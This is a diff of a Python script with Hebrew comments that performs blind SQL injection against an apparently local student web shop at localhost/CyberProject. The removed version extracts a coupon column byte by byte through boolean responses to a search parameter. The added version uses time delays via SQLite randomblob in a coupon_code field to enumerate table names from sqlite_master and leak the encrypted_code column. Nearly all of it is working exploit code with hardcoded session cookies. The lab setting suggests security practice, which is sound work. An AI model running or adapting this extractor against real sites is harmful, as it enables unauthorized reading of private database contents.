@@ -1,73 +1,99 @@
--- עדכון הקופון כך שיתחיל בבייט אפס (Null Byte)
-UPDATE internal_coupons 
-SET encrypted_code = X'00' || 'SECRET50' 
-WHERE id = 1;
-
 import requests
+import time
 
-# --- נתונים מהאתר ---
-BASE_URL = "http://localhost/CyberProject/products.php"
-COOKIES = {'PHPSESSID': 'rv82jh01b0c0pq4ift362fg6vp'}
+# כתובת האתר והעוגיות (Session ID)
+URL = "http://localhost/CyberProject/cart.php"
+COOKIES = {'PHPSESSID': 'p36d9sfpspku81ps8am2fdckbb'}
+ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@#"
 
-# תווים הקסדצימליים לבדיקת בייטים (00 עד FF)
-HEX_CHARS = "0123456789ABCDEF"
-
-def check_condition(payload):
-    # שימוש בפרמטר q שבו מצאנו את הפרצה
-    params = {'q': f"%' AND ({payload}) --"}
+def get_baseline():
+    print("[+] Measuring server baseline response time...")
     try:
-        response = requests.get(BASE_URL, params=params, cookies=COOKIES)
-        # אם התנאי אמת, המוצרים (product-card) יופיעו בדף
-        return "product-card" in response.text
+        start = time.time()
+        requests.post(URL, data={"coupon_code": "test", "apply_coupon": "1"}, cookies=COOKIES)
+        return time.time() - start
     except Exception as e:
-        print(f"[!] Error: {e}")
+        print(f"[!] Baseline measurement failed: {e}")
+        return 0.1
+
+def check_condition_time(payload, baseline):
+    # we added randomblob to make the server slower so we will know we have SQL injection
+    time_delay_query = f"CASE WHEN ({payload}) THEN randomblob(250000000) ELSE 1 END"
+    
+    data = {
+        "coupon_code": f"' OR ({time_delay_query}) --",
+        "apply_coupon": "1"
+    }
+    
+    start = time.time()
+    try:
+        requests.post(URL, data=data, cookies=COOKIES)
+        duration = time.time() - start
+        return duration > (baseline + 0.5)
+    except Exception as e:
         return False
 
-def leak_coupon():
-    hex_result = ""
-    decoded_string = ""
-    print("[*] Starting Blind SQLi - Binary Extraction Mode...")
-    print("[*] Target Table: internal_coupons | Column: encrypted_code")
-    
+def discover_table_name(baseline):
+    print("[+] Discovering table name from sqlite_master...")
+    table_name = ""
     pos = 1
+    
     while True:
-        found_byte = False
-        # ניחוש בייט אחד (מיוצג ע"י 2 תווי HEX)
-        for c1 in HEX_CHARS:
-            for c2 in HEX_CHARS:
-                guess_hex = c1 + c2
-                
-                # השאילתה בודקת את הערך ההקסדצימלי של הבייט במיקום pos
-                sub_query = f"SELECT HEX(SUBSTR(encrypted_code,{pos},1)) FROM internal_coupons LIMIT 1"
-                payload = f"({sub_query})='{guess_hex}'"
-                
-                if check_condition(payload):
-                    hex_result += guess_hex
-                    
-                    # ניסיון פענוח התו לצורך תצוגה בלבד
-                    try:
-                        char = bytes.fromhex(guess_hex).decode('ascii')
-                        if char.isprintable():
-                            decoded_string += char
-                        else:
-                            decoded_string += f"\\x{guess_hex}" # הצגת תווים לא קריאים כמו 00
-                    except:
-                        decoded_string += f"\\x{guess_hex}"
-                        
-                    print(f"[+] Pos {pos}: Found HEX {guess_hex} | Current: {decoded_string}")
-                    found_byte = True
-                    break
-            if found_byte: break
+        found_char = False
+        for char in ALPHABET:
+            payload = f"UPPER(SUBSTR((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1), {pos}, 1)) = '{char}'"
+            if check_condition_time(payload, baseline):
+                table_name += char
+                print(f"[TABLE ENUM] Position {pos}: {char} -> {table_name}")
+                found_char = True
+                break
         
-        if not found_byte:
-            # אם לא מצאנו אף בייט בטווח, כנראה הגענו לסוף המידע
+        if not found_char:
+            break
+        pos += 1
+    return table_name
+
+def leak_data_unlimited(table, column, baseline):
+    discovered = ""
+    pos = 1
+    print(f"\n[+] Starting Attack on {table}.{column}...")
+
+    while True:
+        found_char = False
+        for char in ALPHABET:
+            payload = f"UPPER(SUBSTR((SELECT {column} FROM {table} LIMIT 1), {pos}, 1)) = '{char}'"
+            if check_condition_time(payload, baseline):
+                discovered += char
+                print(f"[DATA ENUM] Position {pos}: {char} -> Current: {discovered}")
+                found_char = True
+                break
+        
+        if not found_char:
+            print(f"[+] End of string reached at position {pos}.")
             break
         pos += 1
             
-    return decoded_string
+    return discovered
 
-# הרצת החילוץ
-final_coupon = leak_coupon()
-print("-" * 40)
-print(f"[!] Extraction Complete!")
-print(f"[!] Final Value: {final_coupon}")
+if __name__ == "__main__":
+    baseline_time = get_baseline()
+    if baseline_time == 0: baseline_time = 0.1
+    print(f"[+] Baseline: {baseline_time:.2f}s. Threshold: {(baseline_time + 0.5):.2f}s")
+
+    table_name = discover_table_name(baseline_time)
+    
+    if table_name:
+        print(f"\n[!] Success! Found table: {table_name}")
+        choice = input(f"Do you want to extract data from table '{table_name}'? (Y/N): ").strip().upper()
+        
+        if choice == 'Y':
+            extracted = leak_data_unlimited(table_name, "encrypted_code", baseline_time)
+            
+            if extracted:
+                print(f"\n[SUCCESS] Final Data Discovered: {extracted}")
+            else:
+                print("\n[!] Failed to extract data content.")
+        else:
+            print("\n[.] Attack aborted by user.")
+    else:
+        print("\n[!] Failed to discover table name.")
